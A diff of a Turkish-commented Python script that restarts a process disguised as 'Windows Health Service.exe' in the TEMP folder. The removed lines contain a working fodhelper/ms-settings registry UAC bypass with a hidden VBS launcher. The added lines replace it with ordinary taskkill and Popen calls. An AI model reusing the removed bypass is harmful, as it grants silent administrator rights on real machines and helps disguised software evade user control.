@@ -1,62 +1,44 @@
 import os
-import winreg
+import subprocess
 import time
-import ctypes
 import sys
 
+# Hedef dosya adı ve konumu
 target_process_name = "Windows Health Service.exe"
 temp_folder = os.environ.get('TEMP')
+full_path = os.path.join(temp_folder, target_process_name)
 
-def create_support_files():
-    """Kapatma ve Açma işlemleri için sessiz VBS ve BAT dosyalarını oluşturur."""
-    kill_vbs = os.path.join(temp_folder, "kill_service.vbs")
-    
-    # Kapatma VBS'si: Taskkill'i tamamen gizli çalıştırır
-    with open(kill_vbs, "w") as f:
-        f.write(f'Set WshShell = CreateObject("WScript.Shell")\n')
-        f.write(f'WshShell.Run "taskkill /F /IM ""{target_process_name}"" /T", 0, True')
-    
-    return kill_vbs
-
-def uac_bypass_vbs(vbs_path):
-    """fodhelper üzerinden bir VBS dosyasını sessizce tetikler."""
-    reg_path = r'Software\Classes\ms-settings\shell\open\command'
+def kill_process(process_name):
+    """İşlemi standart kullanıcı yetkisiyle kapatmaya çalışır."""
     try:
-        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
-            # VBS'yi wscript ile tetikliyoruz
-            command = f'wscript.exe "{vbs_path}"'
-            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
-            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-        
-        # fodhelper'ı gizli modda başlat
-        ctypes.windll.shell32.ShellExecuteW(None, "open", "fodhelper.exe", None, None, 0)
-        time.sleep(4)
-        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
-    except:
-        pass
+        # taskkill komutunu sessizce (arka planda) çalıştırır
+        subprocess.run(["taskkill", "/F", "/IM", process_name, "/T"], 
+                       stdout=subprocess.DEVNULL, 
+                       stderr=subprocess.DEVNULL)
+        print(f"Bilgi: {process_name} kapatma komutu gönderildi.")
+    except Exception as e:
+        print(f"Hata: İşlem kapatılamadı: {e}")
+
+def start_process(exe_path):
+    """İşlemi standart kullanıcı yetkisiyle başlatır."""
+    if os.path.exists(exe_path):
+        try:
+            # Popen kullanarak betik beklemek zorunda kalmadan başlatır
+            subprocess.Popen([exe_path], shell=True)
+            print(f"Bilgi: {exe_path} başlatıldı.")
+        except Exception as e:
+            print(f"Hata: Uygulama başlatılamadı: {e}")
+    else:
+        print("Hata: Hedef dosya TEMP klasöründe bulunamadı.")
 
 if __name__ == "__main__":
-    # 1. Yardımcı dosyaları oluştur
-    kill_vbs_path = create_support_files()
-
-    # 2. ÖNCE KAPAT (VBS üzerinden sessizce)
-    uac_bypass_vbs(kill_vbs_path)
-
-    # 3. SONRA AÇ (Doğrudan EXE yoluyla sessizce)
-    full_path = os.path.join(temp_folder, target_process_name)
-    if os.path.exists(full_path):
-        reg_path = r'Software\Classes\ms-settings\shell\open\command'
-        try:
-            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
-                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{full_path}"')
-                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-            
-            ctypes.windll.shell32.ShellExecuteW(None, "open", "fodhelper.exe", None, None, 0)
-            time.sleep(4)
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
-        except:
-            pass
+    # 1. Adım: Mevcut işlemi kapat
+    kill_process(target_process_name)
+    
+    # Kısa bir bekleme süresi
+    time.sleep(2)
+    
+    # 2. Adım: İşlemi tekrar başlat
+    start_process(full_path)
 
     sys.exit()
